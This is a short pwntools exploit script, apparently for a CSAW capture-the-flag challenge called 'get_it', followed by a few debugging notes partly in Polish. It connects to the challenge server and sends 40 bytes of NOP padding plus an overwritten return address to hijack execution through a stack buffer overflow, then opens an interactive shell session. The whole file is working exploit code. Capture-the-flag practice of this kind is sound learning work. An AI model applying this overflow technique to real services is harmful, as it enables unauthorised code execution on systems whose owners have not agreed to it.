from pwn import *

context.update(arch="amd64")
context.update(log_level="debug")

key = p64(0x4005b6)


r = remote("pwn.chal.csaw.io",9001)
i=40
#r=process("../Downloads/get_it")
pause()
r.sendline( '\x90' * i+ key )

r.interactive()

'''
tele pokazuje
hexdump
ctrl+r
gdb --pid `pidof boi`
'''